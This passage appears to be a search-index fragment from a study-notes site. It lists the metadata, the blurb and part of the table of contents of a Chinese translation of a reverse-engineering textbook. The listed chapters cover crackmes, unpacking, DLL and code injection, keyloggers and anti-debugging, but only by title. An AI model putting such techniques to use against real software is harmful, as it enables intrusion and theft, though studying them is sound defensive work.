56.6\u3000\u5c0f\u7ed3 647 \u7b2c57\u7ae0\u3000\u8c03\u8bd5\u7ec3\u4e604\uff1aDebug Blocker 648 57.1\u3000Debug Blocker 648 57.2\u3000\u53cd\u8c03\u8bd5\u7279\u5f81 648 57.2.1\u3000\u7236\u4e0e\u5b50\u7684\u5173\u7cfb 649 57.2.2\u3000\u88ab\u8c03\u8bd5\u8fdb\u7a0b\u4e0d\u80fd\u518d\u88ab\u5176\u4ed6\u8c03\u8bd5\u5668\u8c03\u8bd5 649 57.2.3\u3000\u7ec8\u6b62\u8c03\u8bd5\u8fdb\u7a0b\u7684\u540c\u65f6\u4e5f\u7ec8\u6b62\u88ab\u8c03\u8bd5\u8fdb\u7a0b 649 57.2.4\u3000\u8c03\u8bd5\u5668\u64cd\u4f5c\u88ab\u8c03\u8bd5\u8005\u7684\u4ee3\u7801 649 57.2.5\u3000\u8c03\u8bd5\u5668\u5904\u7406\u88ab\u8c03\u8bd5\u8fdb\u7a0b\u4e2d\u53d1\u751f\u7684\u5f02\u5e38 649 57.3\u3000\u8c03\u8bd5\u7ec3\u4e60\uff1aDebugMe4.exe 650 57.4\u3000\u7b2c\u4e00\u6b21\u8c03\u8bd5 650 57.4.1\u3000\u9009\u5b9a\u8c03\u8bd5\u7684\u8d77\u59cb\u4f4d\u7f6e 650 57.4.2\u3000main() 650 57.5\u3000\u7b2c\u4e8c\u6b21\u8c03\u8bd5 651 57.6\u3000\u7b2c\u4e09\u6b21\u8c03\u8bd5 653 57.7\u3000\u7b2c\u56db\u6b21\u8c03\u8bd5 656 57.8\u3000\u7b2c\u4e94\u6b21\u8c03\u8bd5 658 57.8.1\u3000\u7cfb\u7edf\u65ad\u70b9 658 57.8.2\u3000EXCEPTION_ILLEGAL_INSTRUCTION(1) 659 57.8.3\u3000EXCEPTION_ILLEGAL_INSTRUCTION(2) 660 57.9\u3000\u7b2c\u516d\u6b21\u8c03\u8bd5 661 57.9.1\u300040121D\uff08\u7b2c\u4e00\u4e2a\u5f02\u5e38\uff09 661 57.9.2\u3000401299\uff08\u7b2c\u4e8c\u4e2a\u5f02\u5e38\uff09 665 57.10\u3000\u7b2c\u4e03\u6b21\u8c03\u8bd5 667 57.10.1\u3000\u9759\u6001\u65b9\u6cd5 668 57.10.2\u3000\u52a8\u6001\u65b9\u6cd5 669 57.11\u3000\u5c0f\u7ed3 673 \u7ed3\u675f\u8bed 674 \u7d22\u5f15 676","title":"\u9006\u5411\u5de5\u7a0b\u6838\u5fc3\u539f\u7406"},{"location":"Book/PWN/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/#_1","text":"\u4f5c\u8005: [ \u97e9] \u674e\u627f\u8fdc \u51fa\u7248\u793e: \u4eba\u6c11\u90ae\u7535\u51fa\u7248\u793e \u539f\u4f5c\u540d: \ub9ac\ubc84\uc2f1 \ud575\uc2ec\uc6d0\ub9ac \u8bd1\u8005: \u6b66\u4f20\u6d77 \u51fa\u7248\u5e74: 2014-4-25 \u9875\u6570: 679 \u5b9a\u4ef7: 109.00\u5143 \u88c5\u5e27: \u5e73\u88c5 \u4e1b\u4e66: \u56fe\u7075\u7a0b\u5e8f\u8bbe\u8ba1\u4e1b\u4e66 ISBN: 9787115350183","title":"\u9006\u5411\u5de5\u7a0b\u6838\u5fc3\u539f\u7406"},{"location":"Book/PWN/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/#_2","text":"\u672c\u4e66\u5341\u5206\u8be6\u5c3d\u5730\u4ecb\u7ecd\u4e86\u4ee3\u7801\u9006\u5411\u5206\u6790\u7684\u6838\u5fc3\u539f\u7406\u3002\u4f5c\u8005\u5728Ahnlab \u7814\u7a76\u6240\u5de5\u4f5c\u591a\u5e74\uff0c\u4e66\u4e2d\u4e0d\u4ec5\u5305\u62ec\u5176\u4ee5\u6b64\u7ecf\u9a8c\u4e3a\u57fa\u7840\u4eb2\u81ea\u7f16\u5199\u7684\u5927\u91cf\u4ee3\u7801\uff0c\u8fd8\u5305\u542b\u4e86\u9006\u5411\u5de5\u7a0b\u7814\u7a76\u4eba\u5458\u5fc5\u987b\u4e86\u89e3\u7684\u5404\u79cd\u6280\u672f\u548c\u6280\u5de7\u3002\u5f7b\u5e95\u7406\u89e3\u5e76\u5207\u5b9e\u638c\u63e1\u9006\u5411\u5de5\u7a0b\u8fd9\u95e8\u6280\u672f\uff0c\u5c31\u80fd\u5728\u4f17\u591aIT \u76f8\u5173\u9886\u57df\u8fdb\u884c\u62d3\u5c55\u8fd0\u7528\uff0c\u8fd9\u672c\u4e66\u5c31\u662f\u901a\u5411\u9006\u5411\u5de5\u7a0b\u5927\u95e8\u7684\u6377\u5f84\u3002 \u60f3\u6210\u4e3a\u9006\u5411\u5de5\u7a0b\u7814\u7a76\u5458\u7684\u8bfb\u8005\u6216\u6b63\u5728\u4ece\u4e8b\u9006\u5411\u5f00\u53d1\u5de5\u4f5c\u7684\u5f00\u53d1\u4eba\u5458\u4e00\u5b9a\u4f1a\u901a\u8fc7\u672c\u4e66\u83b7\u5f97\u5f88\u5927\u5e2e\u52a9\u3002\u540c\u65f6\uff0c\u60f3\u6210\u4e3a\u5b89\u5168\u9886\u57df\u4e13\u5bb6\u7684\u4eba\u4e5f\u53ef\u4ece\u672c\u4e66\u8f7b\u677e\u8d77\u6b65\u3002","title":"\u5185\u5bb9\u7b80\u4ecb"},{"location":"Book/PWN/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/#_3","text":"\u7b2c\u4e00\u90e8\u5206\u3000\u4ee3\u7801\u9006\u5411\u6280\u672f\u57fa\u7840 \u7b2c1\u7ae0\u3000\u5173\u4e8e\u9006\u5411\u5de5\u7a0b 2 1.1\u3000\u9006\u5411\u5de5\u7a0b 2 1.2\u3000\u4ee3\u7801\u9006\u5411\u5de5\u7a0b 2 1.2.1\u3000\u9006\u5411\u5206\u6790\u6cd5 2 1.2.2\u3000\u6e90\u4ee3\u7801\u3001\u5341\u516d\u8fdb\u5236\u4ee3\u7801\u3001\u6c47\u7f16\u4ee3\u7801 4 1.2.3 \u201c\u6253\u8865\u4e01\u201d\u4e0e\u201c\u7834\u89e3\u201d 5 1.3\u3000\u4ee3\u7801\u9006\u5411\u51c6\u5907 5 1.3.1\u3000\u76ee\u6807 5 1.3.2\u3000\u6fc0\u60c5 6 1.3.3\u3000\u8c37\u6b4c 6 1.4\u3000\u5b66\u4e60\u9006\u5411\u5206\u6790\u6280\u672f\u7684\u7981\u5fcc 6 1.4.1\u3000\u8d2a\u5fc3 6 1.4.2\u3000\u6025\u8e81 7 1.5\u3000\u9006\u5411\u5206\u6790\u6280\u672f\u7684\u4e50\u8da3 7 \u7b2c2\u7ae0\u3000\u9006\u5411\u5206\u6790Hello World!\u7a0b\u5e8f 8 2.1\u3000Hello World!\u7a0b\u5e8f 8 2.2\u3000\u8c03\u8bd5HelloWorld.exe\u7a0b\u5e8f 9 2.2.1\u3000\u8c03\u8bd5\u76ee\u6807 9 2.2.2\u3000\u5f00\u59cb\u8c03\u8bd5 9 2.2.3\u3000\u5165\u53e3\u70b9 10 2.2.4\u3000\u8ddf\u8e2a40270C\u51fd\u6570 10 2.2.5\u3000\u8ddf\u8e2a40104F\u8df3\u8f6c\u8bed\u53e5 12 2.2.6\u3000\u67e5\u627emain()\u51fd\u6570 12 2.3\u3000\u8fdb\u4e00\u6b65\u719f\u6089\u8c03\u8bd5\u5668 14 2.3.1\u3000\u8c03\u8bd5\u5668\u6307\u4ee4 14 2.3.2 \u201c\u5927\u672c\u8425\u201d 15 2.3.3\u3000\u8bbe\u7f6e\u201c\u5927\u672c\u8425\u201d\u7684\u56db\u79cd\u65b9\u6cd5 15 2.4\u3000\u5feb\u901f\u67e5\u627e\u6307\u5b9a\u4ee3\u7801\u7684\u56db\u79cd\u65b9\u6cd5 17 2.4.1\u3000\u4ee3\u7801\u6267\u884c\u6cd5 18 2.4.2\u3000\u5b57\u7b26\u4e32\u68c0\u7d22\u6cd5 19 2.4.3\u3000API\u68c0\u7d22\u6cd5\uff081\uff09\uff1a\u5728\u8c03\u7528\u4ee3\u7801\u4e2d\u8bbe\u7f6e\u65ad\u70b9 20 2.4.4\u3000API\u68c0\u7d22\u6cd5\uff082\uff09\uff1a\u5728API\u4ee3\u7801\u4e2d\u8bbe\u7f6e\u65ad\u70b9 21 2.5\u3000\u4f7f\u7528\u201c\u6253\u8865\u4e01\u201d\u65b9\u5f0f\u4fee\u6539\u201cHello World!\u201d\u5b57\u7b26\u4e32 23 2.5.1 \u201c\u6253\u8865\u4e01\u201d 23 2.5.2\u3000\u4fee\u6539\u5b57\u7b26\u4e32\u7684\u4e24\u79cd\u65b9\u6cd5 24 2.6\u3000\u5c0f\u7ed3 28 \u7b2c3\u7ae0\u3000\u5c0f\u7aef\u5e8f\u6807\u8bb0\u6cd5 31 3.1\u3000\u5b57\u8282\u5e8f 31 3.1.1\u3000\u5927\u7aef\u5e8f\u4e0e\u5c0f\u7aef\u5e8f 32 3.1.2\u3000\u5728OllyDbg\u4e2d\u67e5\u770b\u5c0f\u7aef\u5e8f 32 \u7b2c4\u7ae0\u3000IA-32\u5bc4\u5b58\u5668\u57fa\u672c\u8bb2\u89e3 34 4.1\u3000\u4ec0\u4e48\u662fCPU\u5bc4\u5b58\u5668 34 4.2\u3000IA-32\u5bc4\u5b58\u5668 34 4.3\u3000\u5c0f\u7ed3 40 \u7b2c5\u7ae0\u3000\u6808 41 5.1\u3000\u6808 41 5.1.1\u3000\u6808\u7684\u7279\u5f81 41 5.1.2\u3000\u6808\u64cd\u4f5c\u793a\u4f8b 41 \u7b2c6\u7ae0\u3000\u5206\u6790abex\u2019 crackme#1 44 6.1\u3000abex\u2019 crackme #1 44 6.1.1\u3000\u5f00\u59cb\u8c03\u8bd5 45 6.1.2\u3000\u5206\u6790\u4ee3\u7801 45 6.2\u3000\u7834\u89e3 47 6.3\u3000\u5c06\u53c2\u6570\u538b\u5165\u6808 47 6.4\u3000\u5c0f\u7ed3 48 \u7b2c7\u7ae0\u3000\u6808\u5e27 49 7.1\u3000\u6808\u5e27 49 7.2\u3000\u8c03\u8bd5\u793a\u4f8b\uff1astackframe.exe 49 7.2.1\u3000StackFrame.cpp 50 7.2.2\u3000\u5f00\u59cb\u6267\u884cmain()\u51fd\u6570&\u751f\u6210\u6808\u5e27 51 7.2.3\u3000\u8bbe\u7f6e\u5c40\u90e8\u53d8\u91cf 52 7.2.4\u3000add()\u51fd\u6570\u53c2\u6570\u4f20\u9012\u4e0e\u8c03\u7528 53 7.2.5\u3000\u5f00\u59cb\u6267\u884cadd()\u51fd\u6570&\u751f\u6210\u6808\u5e27 54 7.2.6\u3000\u8bbe\u7f6eadd()\u51fd\u6570\u7684\u5c40\u90e8\u53d8\u91cf\uff08x, y\uff09 55 7.2.7\u3000ADD\u8fd0\u7b97 55 7.2.8\u3000\u5220\u9664\u51fd\u6570add()\u7684\u6808\u5e27&\u51fd\u6570\u6267\u884c\u5b8c\u6bd5\uff08\u8fd4\u56de\uff09 56 7.2.9\u3000\u4ece\u6808\u4e2d\u5220\u9664\u51fd\u6570add()\u7684\u53c2\u6570\uff08\u6574\u7406\u6808\uff09 57 7.2.10\u3000\u8c03\u7528printf()\u51fd\u6570 58 7.2.11\u3000\u8bbe\u7f6e\u8fd4\u56de\u503c 58 7.2.12\u3000\u5220\u9664\u6808\u5e27&main()\u51fd\u6570\u7ec8\u6b62 58 7.3\u3000\u8bbe\u7f6eOllyDbg\u9009\u9879 59 7.3.1\u3000Disasm\u9009\u9879 59 7.3.2\u3000Analysis1\u9009\u9879 60 7.4\u3000\u5c0f\u7ed3 61 \u7b2c8\u7ae0\u3000abex\u2019 crackme #2 62 8.1\u3000\u8fd0\u884cabex\u2019 crackme #2 62 8.2\u3000Visual Basic\u6587\u4ef6\u7684\u7279\u5f81 63 8.2.1\u3000VB\u4e13\u7528\u5f15\u64ce 63 8.2.2\u3000\u672c\u5730\u4ee3\u7801\u548c\u4f2a\u4ee3\u7801 63 8.2.3\u3000\u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f 63 8.2.4\u3000\u672a\u6587\u6863\u5316\u7684\u7ed3\u6784\u4f53 63 8.3\u3000\u5f00\u59cb\u8c03\u8bd5 63 8.3.1\u3000\u95f4\u63a5\u8c03\u7528 64 8.3.2\u3000RT_MainStruct\u7ed3\u6784\u4f53 64 8.3.3\u3000ThunRTMain()\u51fd\u6570 65 8.4\u3000\u5206\u6790crackme 65 8.4.1\u3000\u68c0\u7d22\u5b57\u7b26\u4e32 65 8.4.2\u3000\u67e5\u627e\u5b57\u7b26\u4e32\u5730\u5740 66 8.4.3\u3000\u751f\u6210Serial\u7684\u7b97\u6cd5 68 8.4.4\u3000\u9884\u6d4b\u4ee3\u7801 69 8.4.5\u3000\u8bfb\u53d6Name\u5b57\u7b26\u4e32\u7684\u4ee3\u7801 69 8.4.6\u3000\u52a0\u5bc6\u5faa\u73af 70 8.4.7\u3000\u52a0\u5bc6\u65b9\u6cd5 70 8.5\u3000\u5c0f\u7ed3 72 \u7b2c9\u7ae0\u3000Process Explorer\u2014\u2014 \u6700\u4f18\u79c0\u7684\u8fdb\u7a0b\u7ba1\u7406\u5de5\u5177 74 9.1\u3000Process Explorer 74 9.2\u3000\u5177\u4f53\u6709\u54ea\u4e9b\u4f18\u70b9\u5462 75 9.3\u3000sysinternals 75 \u7b2c10\u7ae0\u3000\u51fd\u6570\u8c03\u7528\u7ea6\u5b9a 76 10.1\u3000\u51fd\u6570\u8c03\u7528\u7ea6\u5b9a 76 10.1.1\u3000cdecl 76 10.1.2\u3000stdcall 77 10.1.3\u3000fastcall 78 \u7b2c11\u7ae0\u3000\u89c6\u9891\u8bb2\u5ea7 79 11.1\u3000\u8fd0\u884c 79 11.2\u3000\u5206\u6790 79 11.2.1\u3000\u76ee\u6807\uff081\uff09\uff1a\u53bb\u9664\u6d88\u606f\u6846 79 11.2.2\u3000\u6253\u8865\u4e01\uff081\uff09\uff1a\u53bb\u9664\u6d88\u606f\u6846 81 11.2.3\u3000\u76ee\u6807\uff082\uff09\uff1a\u67e5\u627e\u6ce8\u518c\u7801 83 11.3\u3000\u5c0f\u7ed3 85 \u7b2c12\u7ae0\u3000\u7a76\u7adf\u5e94\u5f53\u5982\u4f55\u5b66\u4e60\u4ee3\u7801\u9006\u5411\u5206\u6790 86 12.1\u3000\u9006\u5411\u5de5\u7a0b 86 12.1.1\u3000\u4efb\u4f55\u5b66\u4e60\u90fd\u5e94\u5f53\u6709\u76ee\u6807 86 12.1.2\u3000\u62e5\u6709\u79ef\u6781\u5fc3\u6001 86 12.1.3\u3000\u8981\u611f\u53d7\u5176\u4e2d\u7684\u4e50\u8da3 86 12.1.4\u3000\u8ba9\u68c0\u7d22\u6210\u4e3a\u65e5\u5e38\u751f\u6d3b\u7684\u4e00\u90e8\u5206 87 12.1.5\u3000\u6700\u91cd\u8981\u7684\u662f\u5b9e\u8df5 87 12.1.6\u3000\u8bf7\u4fdd\u6301\u5e73\u548c\u7684\u5fc3\u6001 87 \u7b2c\u4e8c\u90e8\u5206\u3000PE\u6587\u4ef6\u683c\u5f0f \u7b2c13\u7ae0\u3000PE\u6587\u4ef6\u683c\u5f0f 90 13.1\u3000\u4ecb\u7ecd 90 13.2\u3000PE\u6587\u4ef6\u683c\u5f0f 90 13.2.1\u3000\u57fa\u672c\u7ed3\u6784 91 13.2.2\u3000VA&RVA 92 13.3\u3000PE\u5934 92 13.3.1\u3000DOS\u5934 93 13.3.2\u3000DOS\u5b58\u6839 94 13.3.3\u3000NT\u5934 94 13.3.4\u3000NT\u5934\uff1a\u6587\u4ef6\u5934 95 13.3.5\u3000NT\u5934\uff1a\u53ef\u9009\u5934 97 13.3.6\u3000\u8282\u533a\u5934 101 13.4\u3000RVA to RAW 104 13.5\u3000IAT 105 13.5.1\u3000DLL 105 13.5.2\u3000IMAGE_IMPORT_DESCRIPTOR 107 13.5.3\u3000\u4f7f\u7528notepad.exe\u7ec3\u4e60 108 13.6\u3000EAT 112 13.6.1\u3000IMAGE_EXPORT_DIRECTORY 113 13.6.2\u3000\u4f7f\u7528kernel32.dll\u7ec3\u4e60 114 13.7\u3000\u9ad8\u7ea7PE 116 13.7.1\u3000PEView.exe 116 13.7.2\u3000Patched PE 117 13.8\u3000\u5c0f\u7ed3 118 \u7b2c14\u7ae0\u3000\u8fd0\u884c\u65f6\u538b\u7f29 121 14.1\u3000\u6570\u636e\u538b\u7f29 121 14.1.1\u3000\u65e0\u635f\u538b\u7f29 121 14.1.2\u3000\u6709\u635f\u538b\u7f29 121 14.2\u3000\u8fd0\u884c\u65f6\u538b\u7f29\u5668 122 14.2.1\u3000\u538b\u7f29\u5668 122 14.2.2\u3000\u4fdd\u62a4\u5668 123 14.3\u3000\u8fd0\u884c\u65f6\u538b\u7f29\u6d4b\u8bd5 123 \u7b2c15\u7ae0\u3000\u8c03\u8bd5UPX\u538b\u7f29\u7684notepad\u7a0b\u5e8f 127 15.1\u3000notepad.exe\u7684EP\u4ee3\u7801 127 15.2\u3000notepad_upx.exe\u7684EP\u4ee3\u7801 127 15.3\u3000\u8ddf\u8e2aUPX\u6587\u4ef6 129 15.3.1\u3000OllyDbg\u7684\u8ddf\u8e2a\u547d\u4ee4 129 15.3.2\u3000\u5faa\u73af #1 129 15.3.3\u3000\u5faa\u73af #2 130 15.3.4\u3000\u5faa\u73af #3 131 15.3.5\u3000\u5faa\u73af #4 131 15.4\u3000\u5feb\u901f\u67e5\u627eUPX OEP\u7684\u65b9\u6cd5 132 15.4.1\u3000\u5728POPAD\u6307\u4ee4\u540e\u7684JMP\u6307\u4ee4\u5904\u8bbe\u7f6e\u65ad\u70b9 132 15.4.2\u3000\u5728\u6808\u4e2d\u8bbe\u7f6e\u786c\u4ef6\u65ad\u70b9 133 15.5\u3000\u5c0f\u7ed3 133 \u7b2c16\u7ae0\u3000\u57fa\u5740\u91cd\u5b9a\u4f4d\u8868 135 16.1\u3000PE\u91cd\u5b9a\u4f4d 135 16.1.1\u3000DLL/SYS 135 16.1.2\u3000EXE 136 16.2\u3000PE\u91cd\u5b9a\u4f4d\u65f6\u6267\u884c\u7684\u64cd\u4f5c 136 16.3\u3000PE\u91cd\u5b9a\u4f4d\u64cd\u4f5c\u539f\u7406 138 16.3.1\u3000\u57fa\u5740\u91cd\u5b9a\u4f4d\u8868 138 16.3.2\u3000IMAGE_BASE_RELOCATION\u7ed3\u6784\u4f53 139 16.3.3\u3000\u57fa\u5740\u91cd\u5b9a\u4f4d\u8868\u7684\u5206\u6790\u65b9\u6cd5 139 16.3.4\u3000\u7ec3\u4e60 141 \u7b2c17\u7ae0\u3000\u4ece\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u5220\u9664.reloc\u8282\u533a 142 17.1\u3000.reloc\u8282\u533a 142 17.2\u3000reloc.exe 142 17.2.1\u3000\u5220\u9664.reloc\u8282\u533a\u5934 142 17.2.2\u3000\u5220\u9664.reloc\u8282\u533a 143 17.2.3\u3000\u4fee\u6539IMAGE_FILE_HEADER 143 17.2.4\u3000\u4fee\u6539IMAGE_OPTIONAL_HEADER 144 17.3\u3000\u5c0f\u7ed3 145 \u7b2c18\u7ae0\u3000UPack PE\u6587\u4ef6\u5934\u8be6\u7ec6\u5206\u6790 146 18.1\u3000UPack\u8bf4\u660e 146 18.2\u3000\u4f7f\u7528UPack\u538b\u7f29notepad.exe 146 18.3\u3000\u4f7f\u7528Stud_PE\u5de5\u5177 148 18.4\u3000\u6bd4\u8f83PE\u6587\u4ef6\u5934 148 18.4.1\u3000\u539fnotepad.exe\u7684PE\u6587\u4ef6\u5934 149 18.4.2\u3000notepad_upack.exe\u8fd0\u884c\u65f6\u538b\u7f29\u7684PE\u6587\u4ef6\u5934 149 18.5\u3000\u5206\u6790UPack\u7684PE\u6587\u4ef6\u5934 150 18.5.1\u3000\u91cd\u53e0\u6587\u4ef6\u5934 150 18.5.2\u3000IMAGE_FILE_HEADER.SizeOfOptionalHeader 150 18.5.3\u3000IMAGE_OPTIONAL_HEADER.NumberOf-RvaAndSizes 152 18.5.4\u3000IMAGE_SECTION_HEADER 153 18.5.5\u3000\u91cd\u53e0\u8282\u533a 155 18.5.6\u3000RVA to RAW 156 18.5.7\u3000\u5bfc\u5165\u8868\uff08IMAGE_IMPORT_DESCRIPTOR array\uff09 158 18.5.8\u3000\u5bfc\u5165\u5730\u5740\u8868 160 18.6\u3000\u5c0f\u7ed3 161 \u7b2c19\u7ae0\u3000UPack\u8c03\u8bd5 ? \u67e5\u627eOEP 162 19.1\u3000OllyDbg\u8fd0\u884c\u9519\u8bef 162 19.2\u3000\u89e3\u7801\u5faa\u73af 163 19.3\u3000\u8bbe\u7f6eIAT 165 19.4\u3000\u5c0f\u7ed3 166 \u7b2c20\u7ae0\u3000\u201c\u5185\u5d4c\u8865\u4e01\u201d\u7ec3\u4e60 167 20.1\u3000\u5185\u5d4c\u8865\u4e01 167 20.2\u3000\u7ec3\u4e60\uff1aPatchme 168 20.3\u3000\u8c03\u8bd5\uff1a\u67e5\u770b\u4ee3\u7801\u6d41 168 20.4\u3000\u4ee3\u7801\u7ed3\u6784 172 20.5 \u201c\u5185\u5d4c\u8865\u4e01\u201d\u7ec3\u4e60 173 20.5.1\u3000\u8865\u4e01\u4ee3\u7801\u8981\u8bbe\u7f6e\u5728\u4f55\u5904\u5462 173 20.5.2\u3000\u5236\u4f5c\u8865\u4e01\u4ee3\u7801 175 20.5.3\u3000\u6267\u884c\u8865\u4e01\u4ee3\u7801 176 20.5.4\u3000\u7ed3\u679c\u786e\u8ba4 177 \u7b2c\u4e09\u90e8\u5206\u3000DLL\u6ce8\u5165 \u7b2c21\u7ae0\u3000Windows\u6d88\u606f\u94a9\u53d6 180 21.1\u3000\u94a9\u5b50 180 21.2\u3000\u6d88\u606f\u94a9\u5b50 180 21.3\u3000SetWindowsHookEx() 181 21.4\u3000\u952e\u76d8\u6d88\u606f\u94a9\u53d6\u7ec3\u4e60 182 21.4.1\u3000\u7ec3\u4e60\u793a\u4f8bHookMain.exe 182 21.4.2\u3000\u5206\u6790\u6e90\u4ee3\u7801 185 21.5\u3000\u8c03\u8bd5\u7ec3\u4e60 187 21.5.1\u3000\u8c03\u8bd5HookMain.exe 188 21.5.2\u3000\u8c03\u8bd5Notepad.exe\u8fdb\u7a0b\u5185\u7684KeyHook.dll 190 21.6\u3000\u5c0f\u7ed3 192 \u7b2c22\u7ae0\u3000\u6076\u610f\u952e\u76d8\u8bb0\u5f55\u5668 194 22.1\u3000\u6076\u610f\u952e\u76d8\u8bb0\u5f55\u5668\u7684\u76ee\u6807 194 22.1.1\u3000\u5728\u7ebf\u6e38\u620f 194 22.1.2\u3000\u7f51\u4e0a\u94f6\u884c 194 22.1.3\u3000\u5546\u4e1a\u673a\u5bc6\u6cc4\u9732 194 22.2\u3000\u952e\u76d8\u8bb0\u5f55\u5668\u7684\u79cd\u7c7b\u4e0e\u53d1\u5c55\u8d8b\u52bf 195 22.3\u3000\u9632\u8303\u6076\u610f\u952e\u76d8\u8bb0\u5f55\u5668 195 22.4\u3000\u4e2a\u4eba\u4fe1\u606f 195 \u7b2c23\u7ae0\u3000DLL\u6ce8\u5165 197 23.1\u3000DLL\u6ce8\u5165 197 23.2\u3000DLL\u6ce8\u5165\u793a\u4f8b 198 23.2.1\u3000\u6539\u5584\u529f\u80fd\u4e0e\u4fee\u590dBug 198 23.2.2\u3000\u6d88\u606f\u94a9\u53d6 198 23.2.3\u3000API\u94a9\u53d6 198 23.2.4\u3000\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f 199 23.2.5\u3000\u6076\u610f\u4ee3\u7801 199 23.3\u3000DLL\u6ce8\u5165\u7684\u5b9e\u73b0\u65b9\u6cd5 199 23.4\u3000CreateRemoteThread() 199 23.4.1\u3000\u7ec3\u4e60\u793a\u4f8bmyhack.dll 199 23.4.2\u3000\u5206\u6790\u793a\u4f8b\u6e90\u4ee3\u7801 203 23.4.3\u3000\u8c03\u8bd5\u65b9\u6cd5 208 23.5\u3000AppInit_DLLs 210 23.5.1\u3000\u5206\u6790\u793a\u4f8b\u6e90\u7801 211 23.5.2\u3000\u7ec3\u4e60\u793a\u4f8bmyhack2.dll 212 23.6\u3000SetWindowsHookEx() 214 23.7\u3000\u5c0f\u7ed3 214 \u7b2c24\u7ae0\u3000DLL\u5378\u8f7d 216 24.1\u3000DLL\u5378\u8f7d\u7684\u5de5\u4f5c\u539f\u7406 216 24.2\u3000\u5b9e\u73b0DLL\u5378\u8f7d 216 24.2.1\u3000\u83b7\u53d6\u8fdb\u7a0b\u4e2d\u52a0\u8f7d\u7684DLL\u4fe1\u606f 219 24.2.2\u3000\u83b7\u53d6\u76ee\u6807\u8fdb\u7a0b\u7684\u53e5\u67c4 220 24.2.3\u3000\u83b7\u53d6FreeLibrary() API\u5730\u5740 220 24.2.4\u3000\u5728\u76ee\u6807\u8fdb\u7a0b\u4e2d\u8fd0\u884c\u7ebf\u7a0b 220 24.3\u3000DLL\u5378\u8f7d\u7ec3\u4e60 220 24.3.1\u3000\u590d\u5236\u6587\u4ef6\u53ca\u8fd0\u884cnotepad.exe 220 24.3.2\u3000\u6ce8\u5165myhack.dll 221 24.3.3\u3000\u5378\u8f7dmyhack.dll 222 \u7b2c25\u7ae0\u3000\u901a\u8fc7\u4fee\u6539PE\u52a0\u8f7dDLL 224 25.1\u3000\u7ec3\u4e60\u6587\u4ef6 224 25.1.1\u3000TextView.exe 224 25.1.2\u3000TextView_patched.exe 225 25.2\u3000\u6e90\u4ee3\u7801 - myhack3.cpp 227 25.2.1\u3000DllMain() 227 25.2.2\u3000DownloadURL() 228 25.2.3\u3000DropFile() 229 25.2.4\u3000dummy() 230 25.3\u3000\u4fee\u6539TextView.exe\u6587\u4ef6\u7684\u51c6\u5907\u5de5\u4f5c 231 25.3.1\u3000\u4fee\u6539\u601d\u8def 231 25.3.2\u3000\u67e5\u770bIDT\u662f\u5426\u6709\u8db3\u591f\u7a7a\u95f4 231 25.3.3\u3000\u79fb\u52a8IDT 233 25.4\u3000\u4fee\u6539TextView.exe 235 25.4.1\u3000\u4fee\u6539\u5bfc\u5165\u8868\u7684RVA\u503c 235 25.4.2\u3000\u5220\u9664\u7ed1\u5b9a\u5bfc\u5165\u8868 235 25.4.3\u3000\u521b\u5efa\u65b0IDT 235 25.4.4\u3000\u8bbe\u7f6eName\u3001INT\u3001IAT 236 25.4.5\u3000\u4fee\u6539IAT\u8282\u533a\u7684\u5c5e\u6027\u503c 238 25.5\u3000\u68c0\u6d4b\u9a8c\u8bc1 240 25.6\u3000\u5c0f\u7ed3 241 \u7b2c26\u7ae0\u3000PE Tools 242 26.1\u3000PE Tools 242 26.1.1\u3000\u8fdb\u7a0b\u5185\u5b58\u8f6c\u50a8 243 26.1.2\u3000PE\u7f16\u8f91\u5668 245 26.2\u3000\u5c0f\u7ed3 245 \u7b2c27\u7ae0\u3000\u4ee3\u7801\u6ce8\u5165 247 27.1\u3000\u4ee3\u7801\u6ce8\u5165 247 27.2\u3000DLL\u6ce8\u5165\u4e0e\u4ee3\u7801\u6ce8\u5165 247 27.3\u3000\u7ec3\u4e60\u793a\u4f8b 249 27.3.1\u3000\u8fd0\u884cnotepad.exe 249 27.3.2\u3000\u8fd0\u884cCodeInjection.exe 249 27.3.3\u3000\u5f39\u51fa\u6d88\u606f\u6846 250 27.4\u3000CodeInjection.cpp 250 27.4.1\u3000main()\u51fd\u6570 251 27.4.2\u3000ThreadProc()\u51fd\u6570 251 27.4.3\u3000InjectCode()\u51fd\u6570 254 27.5\u3000\u4ee3\u7801\u6ce8\u5165\u8c03\u8bd5\u7ec3\u4e60 256 27.5.1\u3000\u8c03\u8bd5notepad.exe 256 27.5.2\u3000\u8bbe\u7f6eOllyDbg\u9009\u9879 256 27.5.3\u3000\u8fd0\u884cCodeInjection.exe 257 27.5.4\u3000\u7ebf\u7a0b\u5f00\u59cb\u4ee3\u7801 258 27.6\u3000\u5c0f\u7ed3 259 \u7b2c28\u7ae0\u3000\u4f7f\u7528\u6c47\u7f16\u8bed\u8a00\u7f16\u5199\u6ce8\u5165\u4ee3\u7801 260 28.1\u3000\u76ee\u6807 260 28.2\u3000\u6c47\u7f16\u7f16\u7a0b 260 28.3\u3000OllyDbg\u7684\u6c47\u7f16\u547d\u4ee4 260 28.3.1\u3000\u7f16\u5199ThreadProc()\u51fd\u6570 262 28.3.2\u3000\u4fdd\u5b58\u6587\u4ef6 265 28.4\u3000\u7f16\u5199\u4ee3\u7801\u6ce8\u5165\u7a0b\u5e8f 266 28.4.1\u3000\u83b7\u53d6ThreadProc()\u51fd\u6570\u7684\u4e8c\u8fdb\u5236\u4ee3\u7801 266 28.4.2\u3000CodeInjection2.cpp 267 28.5\u3000\u8c03\u8bd5\u7ec3\u4e60 270 28.5.1\u3000\u8c03\u8bd5notepad.exe 270 28.5.2\u3000\u8bbe\u7f6eOllyDbg\u9009\u9879 270 28.5.3\u3000\u8fd0\u884cCodeInjection2.exe 271 28.5.4\u3000\u7ebf\u7a0b\u8d77\u59cb\u4ee3\u7801 272 28.6\u3000\u8be6\u7ec6\u5206\u6790 272 28.6.1\u3000\u751f\u6210\u6808\u5e27 272 28.6.2\u3000THREAD_PARAM\u7ed3\u6784\u4f53\u6307\u9488 273 28.6.3 \u201cUser32.dll\u201d\u5b57\u7b26\u4e32 274 